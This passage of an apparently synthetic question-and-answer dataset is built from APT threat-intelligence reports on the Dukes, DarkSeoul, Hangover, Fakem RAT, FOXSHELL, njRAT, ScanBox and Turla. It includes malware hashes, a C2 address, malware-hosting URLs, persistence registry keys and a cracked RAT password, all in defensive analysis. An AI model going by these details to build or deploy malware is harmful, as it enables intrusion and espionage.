\uf077\n00852745cb40730dc333124549a768b471dff4bc\n03661a5e2352a797233c23883b25bb652f03f205\n045867051a6052d1d910abfcb24a7674bcc046ca\n0d78d1690d2db2ee322ca11b82d79c758a901ebc\n0e263d80c46d5a538115f71e077a6175168abc5c\n118114446847ead7a2fe87ecb4943fdbdd2bbd1e\n15c75472f160f082f6905d57a98de94c026e2c56\n1ba5bcd62abcbff517a4adb2609f721dd7f609df\n1e6b9414fce4277207aab2aa12e4f0842a23f9c1\n223c7eb7b9dde08ee028bba6552409ee144db54a\n28a43eac3be1b96c68a1e7463ae91367434a2ac4\n296fd4c5b4bf8ea288f45b4801512d7dec7c497b\n2a13ae3806de8e2c7adba6465c4b2a7bb347f0f5\n2ceae0f5f3efe366ebded0a413e5ea264fbf2a33\n2d74a4efaecd0d23afcad02118e00c08e17996ed\n30b377e7dc2418607d8cf5d01ae1f925eab2f037\n31ab6830f4e39c2c520ae55d4c4bffe0b347c947\n36b969c1b3c46953077e4aabb75be8cc6aa6a327\n416d1035168b99cc8ba7227d4c7c3c6bc1ce169a\n43fa0d5a30b4cd72bb7e156c00c1611bb4f4bd0a\n493d0660c9cf738be08209bfd56351d4cf075877\n4b4841ca3f05879ca0dab0659b07fc93a780f9f1\n4ec769c15a9e318d41fd4a1997ec13c029976fc2\n53140342b8fe2dd7661fce0d0e88d909f55099db\n5acaea49540635670036dc626503431b5a783b56\n5b2c4da743798bde4158848a8a44094703e842cb\n634a1649995309b9c7d163af627f7e39f42d5968\n683104d28bd5c52c53d2e6c710a7bd19676c28b8\n694fa03160d50865dce0c35227dc97ffa1acfa48\n73366c1eb26b92886531586728be4975d56f7ca5\n827de388e0feabd92fe7bd433138aa35142bd01a\n909d369c42125e84e0650f7e1183abe740486f58\n9796d22994ff4b4e838079d2e5613e7ac425dd1d\na32817e9ff07bc69974221d9b7a9b980fa80b677\na4e39298866b72e5399d5177f717c46861d8d3df\na6c18fcbe6b25c370e1305d523b5de662172875b\na9e529c7b04a99019dd31c3c0d7f576e1bbd0970\nad9734b05973a0a0f1d34a32cd1936e66898c034\nb27f6174173e71dc154413a525baddf3d6dea1fd\nb8b116d11909a05428b7cb6dcce06113f4cc9e58\nc17ad20e3790ba674e3fe6f01b9c10270bf0f0e4\nc39d0b12bb1c25cf46a5ae6b197a59f8ea90caa0\nc6d3dac500de2f46e56611c13c589e037e4ca5e0\ncb3a83fc24c7b6b0b9d438fbf053276cceaacd2e\ncc3df7de75db8be4a0a30ede21f226122d2dfe87\ncd50170a70b9cc767aa4b21a150c136cb25fbd44\ncdcfac3e9d60aae54586b30fa5b99f180839deed\nd22d80da6f042c4da3392a69c713ee4d64be8bc8\nd81b0705d26390eb82188c03644786dd6f1a2a9e\nde8e9def2553f4d211cc0b34a3972d9814f156aa\ne4add0b118113b2627143c7ef1d5b1327de395f1\ne95e2c166be39a4d9cd671531b376b1a8ceb4a55\nedf74413a6e2763147184b5e1b8732537a854365\nefcb9be7bf162980187237bcb50f4da2d55430c2\nf62600984c5086f2da3d70bc1f5042cf464f928d\nMedium Headline: F-Secure detection names\nBackdoor:W32/MiniDuke.A\nTrojan-Dropper:W32/MiniDuke.B\nExploit:W32/MiniDuke.C\nTrojan-Dropper:W32/MiniDuke.D\nBackdoor:W32/MiniDuke.E\nBackdoor:W32/MiniDuke.F\nBackdoor:W32/MiniDuke.F\nBackdoor:W32/MiniDuke.H\nBackdoor:W32/MiniDuke.I\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\nTrojan:W32/CosmicDuke.H \uf077 \uf077 \uf077 \uf077 \uf077 \uf077\nBackdoor:W32/MiniDuke.J\nTrojan-Dropper:W32/CosmicDuke.A\nTrojan-PSW:W32/CosmicDuke.B\nTrojan:W32/CosmicDuke.C\nExploit:W32/CosmicDuke.D\nExploit:SWF/CosmicDuke.E\nTrojan-PSW:W32/CosmicDuke.F\nTrojan-Dropper:W32/CosmicDuke.G\nTrojan:W32/CosmicDuke.I\nBackdoor:W32/OnionDuke.A\nTrojan-Dropper:W32/OnionDuke.A\nBackdoor:W32/OnionDuke.B\nTrojan:W32/OnionDuke.C\nTrojan:W32/OnionDuke.D\nTrojan-PSW:W32/OnionDuke.E\nTrojan:W32/OnionDuke.F\nTrojan:W32/OnionDuke.G\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\nTrojan:W32/CozyDuke.B \uf077 \uf077 \uf077 \uf077 \uf077\nTrojan:W32/CozyDuke.A\nTrojan-Dropper:W32/CozyDuke.C\nTrojan:W32/CozyDuke.D\nTrojan:W64/CozyDuke.E\nTrojan-Downloader:W32/CloudDuke.A\nTrojan:W32/CloudDuke.B\nTrojan:W64/CloudDuke.B\nBackdoor:W32/SeaDuke.A\nNote: F-Secure also detects various Duke malware components with other detections not specific to the Dukes.\n\nHow does the identification and categorization of malware variants, such as those listed under the 'MiniDuke' section, aid cybersecurity experts in mitigating threats posed by the Dukes? Explain the significance of having multiple detection names and SHA1 hashes.",
    "output": "A: The identification and categorization of malware variants, such as those listed under the 'MiniDuke' section, aid cybersecurity experts in several ways. Firstly, having multiple detection names (e.g., Backdoor:W32/MiniDuke.A, Trojan-Dropper:W32/MiniDuke.B) allows experts to understand the specific functionality and behavior of each variant, enabling them to tailor their response strategies accordingly. For instance, knowing whether a variant is a backdoor or a trojan dropper helps in prioritizing remediation efforts. Additionally, the SHA1 hashes provide unique identifiers for each malware sample, allowing for precise tracking and blocking of known threats. This granularity ensures that security systems can effectively detect and prevent the spread of these malicious programs. Furthermore, the categorization helps in understanding the evolution of the threat landscape, as new variants can be compared to older ones to identify trends and patterns in the Dukes' tactics, techniques, and procedures (TTPs). This comprehensive approach enhances the overall defensive posture against sophisticated cyberespionage groups like the Dukes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "323 (<http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware>)http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware\n324 http://www.presstv.com/detail/2013/03/20/294499/north-korea-threatens-us-over-bombers/\n325 http://www.huffingtonpost.com/2013/03/20/north-koreas-drone_n_2914794.html\n326 (<https://www.youtube.com/watch?v=Dyap>)https://www.youtube.com/watch?v=Dyap eCiOl9A\nIn May 2013, DarkSeoul malware was used to attack several South Korean financial institutions; and in June, DarkSeoul DDoS attacks were launched against the South Korean government's DNS server. The latter took place on June 25, the anniversary of the start of the Korean War.328\nAs evidenced above, much of North Korea's cyber activity coincides with the annual U.S. \u2013 South Korea joint military exercises. Attacks not following that pattern were typically in response to political events impacting the regime or correlated with significant dates, such as the anniversary of the start of the Korean War. The regime's strategic assets and tactical capabilities in the cyber arena seem to have evolved only slightly since 2009. Most of the attacks attributed to North Korea employ limited tactics, and their operational capability demonstrates an increase in the frequency and volume of attacks but is otherwise unimpressive to date.\nIn June 2014, the regime demanded cancellation of the annual U.S. - South Korea joint military exercise, attempting to use participation in the upcoming Asian Games as a bargaining chip.329 The regime's demands may have had other political motivations, as they preceded the July 2014 meeting between South Korean president Park and Chinese President Xi Jinping. The meeting\ncentered on trade and regional security issues, including the ever-present rhetoric around denuclearization of North Korea.330 Both leaders were critical of Japan's recent announcement to soften sanctions on North Korea.331 As this report headed to press, the annual U.S. \u2013 South Korea joint military exercises were underway.332\n327 https://www.youtube.com/watch?v=DyapeCiOl9A\n328 (<http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war>)http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war\n329 http://www.theguardian.com/world/2014/jun/30/north-korea-demands-cancellation-drills\nQ: How did North Korea's cyber activities in May and June 2013 correlate with significant historical and political events, and what does this suggest about their strategic approach to cyber warfare?",
    "output": "In May 2013, DarkSeoul malware was used to attack several South Korean financial institutions, and in June, DarkSeoul DDoS attacks were launched against the South Korean government's DNS server. These attacks coincided with significant dates, such as the anniversary of the start of the Korean War on June 25. This correlation suggests that North Korea strategically times its cyber activities to align with historical and political events, potentially to maximize their impact and send a symbolic message. The attacks also demonstrate a pattern where North Korea's cyber activities often coincide with annual U.S.-South Korea joint military exercises or respond to political events affecting the regime. This strategic timing indicates that North Korea uses cyber warfare as a tool to exert pressure and influence geopolitical dynamics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Researchers at Blue Coat Systems have identified an intelligence-gathering campaign related to the Hangover operation detailed in 2013. The targets of this operation appear to be Pakistani and presumably represent military interests.\nThe malware used for this is very simple, but uses a little used format. Instead of the programming languages most commonly used for malware creation, the actors have turned to using Python, a powerful scripting language. The scripts were found embedded inside regular executable files designed to run Python scripts without having to install the full Python package.\nThe inclusion of malicious scripting code in relatively mainstream installers is probably done to avoid antivirus detections, and regular AV detection rates on these executables tend to be quite low. However, BlueCoat Malware Analysis Appliance proactively detects these malwares with a high risk score.\nSeveral indicators point towards the same attackers as were detailed in the Norman Shark (now part of Blue Coat Systems) Hangover report from last year. This campaign is not the first sign of life from these actors after we published our report \u2013 there have been several smaller initiatives during the autumn of 2013.\n\nQuestion: Why did the attackers behind the Hangover operation choose to use Python for their malware, and how does this choice help them evade antivirus detection?\n\nAnswer:",
    "output": "The attackers behind the Hangover operation chose to use Python for their malware because it is a powerful scripting language that is less commonly used for malware creation compared to other programming languages. By embedding the malicious Python scripts inside regular executable files designed to run Python scripts without requiring the full Python package, the attackers aimed to avoid antivirus detections. This strategy is effective because many antivirus solutions have lower detection rates for Python-based malware, especially when it is packaged in a way that makes it appear like a legitimate application. The inclusion of malicious scripting code in relatively mainstream installers helps the malware bypass traditional security measures, making it harder for antivirus software to identify and flag the malicious activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 5.1 Description\nOn one of the proxy server, we identified a binary called Terminator3.6.exe. After a quick analysis we noticed that this binary is the server side of a homemade Remote Administration Tool (RAT). After analysis, we identified that this sample corresponds to Fakem RAT discovered by Trendmicro in January 2013. Additional information can be found there: http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-fakem-rat.pdf.\nWe were lucky enough to find the client side (the malware) on the same server. These two binaries allowed us to test the product and see how it works.\nMedium Headline: 5.2 Password protection\nWhen the server is starting, a password is asked:\nWe decided to crack this password. A CRC is generated based on the supplied password. Here is the algorithm of this CRC:\nAfter this operation, a xor, then a compare operation is done:\nTo obtain the password, we developed a brute forcer; the code source is available in the appendix.\nThe first argument is the maximum number or characters and the second is the value used in the comparison (available in the ASM code).\nIn this case the password to start the server is \"Ap@hX\".\nAnswer this question: How did the investigators manage to identify and verify the password required to start the server component of the Fakem RAT, which was associated with APT1?",
    "output": "The investigators managed to identify and verify the password required to start the server component of the Fakem RAT through a series of technical steps. First, they recognized that the server prompted for a password upon startup. They then analyzed the binary and discovered that a CRC (Cyclic Redundancy Check) was generated based on the supplied password. This CRC underwent a XOR operation followed by a comparison operation. To crack the password, the investigators developed a brute force tool. The brute force tool took the maximum number of characters and the value used in the comparison (found in the assembly code) as inputs. Through this process, they successfully determined that the password to start the server was 'Ap@hX'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Targeting\nBased on our visibility into the latest wave of attacks that utilize LIONTAIL, the observed victims are located across the Middle East region, including Saudi Arabia, the United Arab Emirates, Jordan, Kuwait, Oman, Iraq, and Israel. The majority of the impacted entities belong to government, telecommunications, military, and financial sectors, as well as IT services providers. However, we also observed the infection on the Exchange servers belonging to a regional affiliate of a global non-profit humanitarian network.\nThe geographic region and the targeted profile are aligned with Iranian interests and in line with the typical victim profile that MOIS-affiliated clusters usually target in espionage operations.\nPreviously, DEV-0861, a cluster we believed aligns with Scarred Manticore, was publicly (<https://www.microsoft.com/en-us/security/blog/2022/09/08/microsoft-investigates-iranian-attacks-against-the-albanian-government/>)exposed for the initial access to and data exfiltration from the Albanian government networks, as well as email exfiltration from multiple organizations in the Middle Eastern countries such as Kuwait, Saudi Arabia, Turkey, UAE, and Jordan.\nMedium Headline: Tunna-based web shell\nOne of the earliest samples related to the threat actor's activity is based on a web shell from , an open-source tool designed to tunnel any TCP communication over HTTP. The Tunna web shell allows to connect from the outside to any service on the remote host, including those that are blocked on the firewall, as all the external communication to the web shell is done via HTTP. The IP and the port of the remote host are sent to the web shell in the configuration stage, and in many cases, Tunna is mostly used to proxy RDP connections.\nThe web shell used by the threat actor has the internal version Tunna v1.1g (only version 1.1a is available on Github). The most significant change from the open-source version is the encryption of requests and responses by XORing the data with the pre-defined string szEncryptionKey and appending the constant string K_SUFFIX at the end:\nMedium Headline: FOXSHELL: XORO version\nOver time, the code was refactored and lost its resemblance to Tunna. We track this and all further versions as FOXSHELL.\nThe biggest changes resulted from organizing multiple entities into classes using an objective-oriented approach. The following class structure persists in most of the FOXSHELL versions:\nAll the functionality responsible for encrypting the traffic moved to a separate EncryptionModule class. This class loads a .NET DLL embedded in a base64encoded string inside the body of FOXSHELL and invokes its encrypt and decrypt methods:\nThe embedded encryption module's name is XORO.dll, and its class Encryption.XORO implements decrypt and encrypt methods the same way as the Tunna-based web shell, using the same hardcoded values:\nAll requests to the web shell are also encapsulated within a class called Package, which handles different PackageTypes: Data, Config, OK, Dispose, or Error. The PackageType is defined by the first byte of the package, and depending on the type of Package, the web shell parses the package and applies the configuration (opens a new socket to the remote machine specified in the configuration and applies a new EncryptionDll if provided), or disposes of the existing socket, or proxies the connection if the package is type Data:\nMedium Headline: FOXSHELL: Bsae64 version (not a typo)\nThis version of the web shell is still unobfuscated, and its internal version is specified in the code:\nconst string Version = \"1.5\"\nThe web shell also contains the default EncryptionDll embedded inside. The module's name is Base64.dll, and the encryption class, which is misspelled as Bsae64, exposes the encrypt and decrypt methods. However, both are just simple base64 encoding:\nAlthough this simple encoding could be done in the code of the web shell itself, the existence of other embedded DLLs, such as XORO.dll (described previously), and the ability to provide yet another EncryptionDll on the configuration stage, implies that the attackers prefer to control which specific type of encryption they want to use by default in certain environments.\nOther changes in this version are the renaming of the PackageType Config to RDPconfig, and ConfigPackage to RDPConfigPackage, indicating the actors are focused on proxying RDP connections. The code of these classes remains the same:\nFinally, another condition in the code handles the case of the web shell receiving a nonempty parameter WV-RESET, which calls a function to shut down the proxy socket and sends an OK response back to the attackers:\nAnswer this question: What is the significance of the class structure and encryption modules in the FOXSHELL web shell, particularly the XORO.dll and Base64.dll modules?",
    "output": "The class structure in the FOXSHELL web shell is significant because it organizes the functionality into distinct components, such as the EncryptionModule class, which handles traffic encryption. The use of embedded .NET DLLs like XORO.dll and Base64.dll allows for modular and flexible encryption methods. XORO.dll uses XOR-based encryption, while Base64.dll uses simple base64 encoding. This modular approach enables the attackers to switch between different encryption methods easily, depending on the environment and the level of obfuscation required. The ability to provide another EncryptionDll during the configuration stage further enhances the adaptability and stealth of the web shell.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do APT groups like Bureau 121, Axiom, and Naikon use reconnaissance techniques to gather information and plan future operations?",
    "output": "Reconnaissance is a critical phase in the adversary lifecycle where attackers gather information to support targeting. In the context of APT groups like Bureau 121, Axiom, and Naikon, reconnaissance plays a vital role in planning future operations. These groups use various reconnaissance techniques to gather information about their targets, including network topology, system vulnerabilities, and employee behavior. For example, Bureau 121, a North Korean APT group, uses reconnaissance to identify vulnerabilities in South Korean financial institutions and media companies. Axiom, a Chinese APT group, conducts reconnaissance to identify targets in the science and technology sectors, including organizations involved in advanced research and development. Naikon, another Chinese APT group, uses reconnaissance to gather information about civilian and military government organizations in Southeast Asia. These groups leverage the gathered information to plan and execute initial access, scope and prioritize post-compromise objectives, and drive further reconnaissance efforts. By understanding the reconnaissance techniques used by these APT groups, organizations can better defend themselves against targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Summary\nThe \"Authorization.exe\" malware sample was created with version V.0.5 of this RAT. The njRAT application was developed with VB.NET (Visual Basic .NET).\nWhen the malware connects to the Command & Control (CnC) server, the attacker is able to perform the following actions from the njRAT CnC server GUI:\n- Open a 'File Manager' window to manipulate files\no This window allows the attacker to Upload & Download, Run, Delete, Edit, Rename, Copy, Cut, Paste, and Empty files.\no The window also allows the attacks to create new folders in the Victim system\n- Open a 'Run File' window\no This window allows the attacker to upload a file, or provide a link to a file to run in the Victim system\n- Open a 'Remote Desktop' window\no When selected, it opens a live window of the Victim's user desktop\n- Open a 'Remote Cam' window\no This window allows the attacker to obtain access to the Victim's system camera to see the Victim user\n- Open a 'Remote Shell' window\no This window opens a reverse shell window and allow the attacker to perform all the activities possible from the command prompt\n- Open a 'Process Manager' window\no This window allows the attacker to Refresh the process list, Kill processes, Suspend processes, Resume processes\n- Open a 'Registry' window\no This window allows the attacker manipulate the Victim's system registry (edit, delete, create keys and values)\n- Open a 'Keylogger' window\no When this option is selected, the keylogger file is automatically uploaded from the Victim system into the attacker's machine\n- Open a 'Get Passwords' window\no This window appears to collect all the passwords stored by the browser (User, Password, URL, App). At the moment of writing this report, the functionality was not confirmed. When the option is selected, the malware searches Mozilla Firefox, Google Chrome, Opera directories.\n- Open a 'Server' window\no This window allows the attacker to Update, Uninstall, Restart, Close, Disconnect, or Rename the malware running in the Victim system\n- Open an 'Open Folder' window\no This window open the local folder in the attackers machine in which the artifacts collected through the \"njRAT\" GUI are stored in his/her system\n- Open a 'Builder' Window\no This window allows the attacker to build new Clients to be deployed to Victims or used in attack campaigns. Some of the options in this builders allows the attacker to configure:\n\u25aa C2 node IP\n\u25aa C2 node port\n\u25aa Vic Tim Name (Looks like this could be used to identify the attack campaign)\n\u25aa Malware name (when it makes a copies itself)\n\u25aa Directory to make a copy of the malware when it is executed\n\u25aa Capabilities to spread via USB\n\u25aa Select the malware icon\n\u25aa Protect the malware process\n\u25aa Stub Randomization\nThe following is a screenshot of the \"njRAT\" v.0.5 CnC GUI when a Victim system connects to it:\nThe following \"About\" information was observed in this version (0.5.0) of the C2 server software found online:\nThe following screenshot shows the Builder interface and default parameters:+1800.652.4020\nThe \"Authorization.exe\" malware has keylogger functionality. It stores the logged keystrokes in the following file: \"[CWD]\\.tmp\". When the malware is dropped by the \"Authorization form may - 2013 - 115444.scr\" carrier file, the logged keystrokes are stored in: \"C:\\Extracted\\.tmp\".\nThe IP address used by the Command & Control (C2) node appears to be under an IP range owned by: \"Palestinian Internet Services, P. O. BOX 5111 Gaza City, Palestine\".\nVariants of this malware have been observed by the community since at least 2012. The malware appears to be known by the community as: njRAT, MSIL/Bladabindi, and Backdoor.LV.\nWhen the \"Authorization.exe\" malware is executed it:\n- Creates a copy of itself in the following locations:\no %APPDATA%\\msnco.exe\no C:\\Documents and Settings\\%USERNAME%\\Start Menu\\Programs\\Startup\\b6554e5bcfef391ff7a7ffda58092e10.exe\n- Tries to open the following file: [CWD]\\ Authorization.exe.config\n- Entrenches in the system for persistence in the following registry locations:\no HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Ru n\\b6554e5bcfef391ff7a7ffda58092e10\no HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\R un\\b6554e5bcfef391ff7a7ffda58092e10\nMakes the following modifications to the registry to bypass the Windows Firewall:\no Key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAcc ations\\List\\[%APPDATA%]\\msnco.exe +1800.652.4020ess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplic\no Value: [%APPDATA%]\\msnco.exe:*:Enabled:msnco.exe\n- Beacons to the following C2 node over TCP port 1177: \"217.66.231.245\"\nThe attacker tries to make sure the malware will run in the system by making the second copy into the above mentioned directory (C:\\Documents and Settings\\%USERNAME%\\Start Menu\\Programs\\Startup\\b6554e5bcfef391ff7a7ffda58092e10.exe)\no This causes the malware to execute again when the system is rebooted and re-starts the infection in the system. Once the system is infected again, it will beacon to the C2 node.\nThe attacker tries to trick the user by using different icons for the malware. Various samples were observed with MS Word and PDF icons. The following is a screenshot of how the file will look like to a normal user:\nWhen the system is configured to show file extensions, the EXE extension is now revealed:\nWhen the malware connects to the C2 node, it will send information about the victim system, malware version, open windows, etc. The following is the network traffic observed:\nlv|'|'|TndfQzQyNjRFQkI=|'|'|VICTIM|'|'|Examiner|'|'|2013-06-21|'|'|USA|'|'|Win XP ProfessionalSP2 x86|'|'|No|'|'|0.5.0E|'|'|..|'|'|Y3B0YnRfUHJvY2Vzc19SZWdpc3RyeV9GaWxlX0luZm8ubG9nIC0gTm90ZXB hZA==|'|'|[endof]act|'|'|\nY3B0YnRfUHJvY2Vzc19SZWdpc3RyeV9GaWxlX0luZm8ubG9nIC0gTm90ZXBhZA== [endof]\nInformation sent by the attacker on opened windows in the system could inform him/her of his malware being analyzed and allowed to connect to the C2 node. For example, if Wireshark, Filemon, Regmon, and IDA are opened in the system when the analyst executes the malware, this will quickly let the attacker know that someone is performing reverse engineering of his malicious code.\nThe following WHOIS information was found related to the C2 node (217.66.231.245): inetnum: 217.66.228.0 - 217.66.231.255 netname: AV_FXD_RA descr: AV_FXD_RA +1800.652.4020\nThe \"Authorization.exe\" variant in this report appears to have been available at some point through the following URL: \"hxxp://bongdacongdong.vn/authorization.exe\". The domain currently resolves to the following IP address: \"112.213.89.144\", but at+1800.652.4020@FidSecSys some point, the domain was associated with the following IP address: \"31.170.165.90\".\nThe following information was found at Virustotal for \"31.170.165.90\":\n- Passive DNS replication\nThe following domains resolved to the given IP address:\n- Latest detected URLs\nLatest URLs hosted in this IP address detected by at least one URL scanner or malicious URL dataset: 3/38 2013-06-09 08:16:23 hxxp://www.saldo-dobrado.id1945.com/sodexo2013/dobro.htm\n2/38 2013-06-05 15:15:03 hxxp://yandload.besaba.com/\n3/38 2013-06-04 02:08:18 hxxp://bongdacongdong.vn/authorization.exe\n4/38 2013-05-30 21:34:09 hxxp://yandload.besaba.com/index.php?f=rubinrot.exe\n5/39 2013-05-24 17:36:28 hxxp://indonesiancode.p.ht/\n2/36 2013-05-10 04:50:52 hxxp://yandload.besaba.com/index.php%3F\n2/37 2013-04-30 05:06:15 hxxp://yandload.besaba.com/index.php%5B%2A%2Aqmark%2A%2A%5D\n2/37 2013-04-29 22:23:55 hxxp://php6.besaba.com/install_flashplayer11x32_mssd_aih.exe\n2/36 2013-04-27 09:14:33 hxxp://aw.nation-sim.net/ips_kernel/sabre/Sabre/DAV/FS/option.php 1/36 2013-04-22 21:56:09 hxxp//alexis.id1945.com/\n- First submission:\n2013-05-28 at 00:12:24\n\nWhat capabilities does the njRAT Command & Control (CnC) server GUI offer to the attacker, and how can these functionalities be leveraged for further attacks?",
    "output": "A: The njRAT CnC server GUI offers a wide range of functionalities to the attacker, including the ability to open a 'File Manager' to manipulate files, a 'Run File' window to execute files, a 'Remote Desktop' window for live access to the victim's desktop, a 'Remote Cam' window to access the victim's webcam, a 'Remote Shell' window for command prompt access, a 'Process Manager' window to manage processes, a 'Registry' window to manipulate the system registry, a 'Keylogger' window to retrieve logged keystrokes, a 'Get Passwords' window to collect stored browser passwords, a 'Server' window to manage the malware, an 'Open Folder' window to access collected artifacts, and a 'Builder' window to create new clients. These functionalities can be leveraged for further attacks by allowing the attacker to exfiltrate data, escalate privileges, move laterally within the network, and maintain persistent access to the victim's system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Player 5 has entered the game\u2026.\nIn all examples of ScanBox deployments discussed so far, we believe that the scripts were deployed to anyone who visited websites of interest to a given sector which the attacker was able to compromise\u2013 and that the attackers waited for victims to visit the compromised site. However one group of attackers using the ScanBox framework are now actively sending e-mails to potential victims, where the e-mails contain links to websites hosting ScanBox. We believe these attackers are not covered by the existing clusters 1 through 4, as the code differs from that used elsewhere.\nThis method of sending links rather than waiting for visiting a specific compromised website has two main advantages:\n\uf0b7 The advantage that the attacker doesn't have to compromise sites that are relevant to the sector they wish to perform reconnaissance against, so generally this will make things easier for the attacker; and,\n\uf0b7 The attacker has to deal with fewer false positives in terms of data received from victims. Even good IP whitelisting techniques will result in some false positives, by controlling the visitors however they can ensure only those they want to scan are scanned.\nThis group differs from the others based on the following characteristics:\n\uf0b7 They send e-mails with links to compromised websites, rather than compromising sites of interest to their targets. Attackers send links to victims using a similar technique to that described in our Sofacy phishing blog14, where multiple redirects are deployed, one being a decoy, the other in this case loading ScanBox:\n\uf0b7 Uses the 'checkFolders' function within the ScanBox code, rather than explicitly checking for files; and,\n\uf0b7 Hosts the ScanBox code on the same page they have compromised rather than on a 3rd party IP address or domain name owned by the attacker.\n14 http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing.pdf\nSo far we have identified four low key websites, all belonging to small companies based in the United States or Canada which are being abused in this fashion.\nAnswer this question: What specific characteristics distinguish the fifth group's use of the ScanBox framework from the other groups? How do these characteristics affect the way the tool is deployed and operated?",
    "output": "The fifth group distinguishes itself by sending emails with links to compromised websites, using multiple redirects similar to the Sofacy phishing technique. Additionally, they use the 'checkFolders' function within the ScanBox code instead of explicitly checking for files, and host the ScanBox code on the same page they have compromised rather than on a third-party IP address or domain name. These characteristics streamline the deployment process and potentially make it harder to detect the attackers' infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Have MIR Customers had Access to these IOCs Before?\nThese IOCs are new! However, much of the detection capability in this set of indicators has already been available to our MIR customers. The IOCs may look different though as a result of improvements in creation and testing. Mandiant started 2013 with a focus on taking better advantage of our threat intelligence. We plan to continue to improve the synthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management process, and IOC testing. The majority of these indicators, or modified versions of them, will be integrated into the next IOC release.\nSmall Headline: What Is the FAMILY Designator in This Set of IOCs?\nWe are using a new IOC designator in these IOCs called \"(FAMILY).\" Mandiant's Threat Intelligence Unit tracks malware by common features seen in groups of binaries. We call those groupings of binaries \"families.\" The IOCs included in this appendix are representatives of families of malware used by APT1. The new designator follows the family name in the \"Name\" field of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole family, not just one sample.\nSmall Headline: Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From Mandiant?\nIn many cases we have combined information that previously would have been in several indicators into a single indicator. Additionally, we have removed certain types of intelligence, since they are being released in separate appendices (such as FQDNs and IPs).\nAdditionally, some IOCs in this set are using file permutation blocks to catch variants of malware that might not be detected otherwise.\n\nWhy does Mandiant use the '(FAMILY)' designator in their Indicators of Compromise (IOCs) related to APT1, and how does this enhance the effectiveness of these IOCs?",
    "output": "A: Mandiant uses the '(FAMILY)' designator in their IOCs to indicate that the IOC applies to an entire family of malware, rather than just a single sample. This approach is based on tracking malware by common features seen in groups of binaries, which Mandiant's Threat Intelligence Unit refers to as 'families.' By using this designator, Mandiant can provide more comprehensive detection capabilities, as the IOCs included in this set represent families of malware used by APT1. This means that even if a specific variant of the malware is encountered, the IOCs are designed to detect it, enhancing the overall effectiveness of the threat detection process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Fidelis Take\nIt is clear from this paper that there continues to be considerable global activity involving threat actors attacking the Oil & Gas industry, and State government in the Middle East. We are publishing these indicators so that others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated.\nFidelis XPS\u2122, the Advanced Threat Defense solution from General Dynamics Fidelis Cybersecurity Solutions detects all of the activity documented in this paper. The Fidelis Threat Research Team will continue to follow this specific activity and actively monitor the ever-evolving threat landscape for the latest threats to our customers' security.\nQ: How does the Fidelis XPS\u2122 solution contribute to the detection and mitigation of threats posed by the STTEAM APT group, particularly in the context of their use of backdoors like 'Zehir ASP Shell' and 'K-Shell/ZHC Shell 1.0/Aspx Shell'?",
    "output": "The Fidelis XPS\u2122 solution, which is an Advanced Threat Defense solution from General Dynamics Fidelis Cybersecurity Solutions, plays a crucial role in detecting and mitigating threats posed by the STTEAM APT group. This solution is designed to identify all the activities documented in the report, including those related to the 'Zehir ASP Shell' and 'K-Shell/ZHC Shell 1.0/Aspx Shell' backdoors. By continuously monitoring and analyzing network traffic and system behavior, Fidelis XPS\u2122 can detect the presence of these backdoors and alert security teams to potential breaches. This proactive approach helps organizations in the Oil & Gas industry and State governments in the Middle East to defend against sophisticated cyber threats. The Fidelis Threat Research Team further supports this effort by actively tracking the evolving threat landscape and updating the solution to address the latest threats, ensuring ongoing protection for customers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Stage 1: loader\nMD5: 43e896ede6fe025ee90f7f27c6d376a4G DATA security solutions detect this as Backdoor.TurlaCarbon.A (Engine A) and Win32.Trojan.Cobra.A (Engine B).\nThe first stage is rather small as the number of instructions and actions is rather small. Simply spoken, its purpose is to load the second stage. To perform this task, the first stage checks all of the files in %SystemRoot%\\inf\\ in order to find the entry with the unique ID previously mentioned and therefore to determine the path for stage 2. After that, the library of the second stage is loaded and, subsequently, the exported function ModuleStart() is executed:\nMedium Headline: Working files and directories\nHere are the working files and directories used by the orchestrator. The orchestrator creates one single random path and then stores all necessary folders mentioned under this one randomly generated path:\n%randompath%\\Nls\\: directory related to the tasks to be executed\n%randompath%\\0208\\: directory related to the temporary files\n%randompath%\\System\\: directory related to the additional plugins\n%randompath%\\System\\bootmisc.sdi: seems not to be used\n%randompath%\\0208\\C_56743.NLS: files related to the tasks to be executed and the 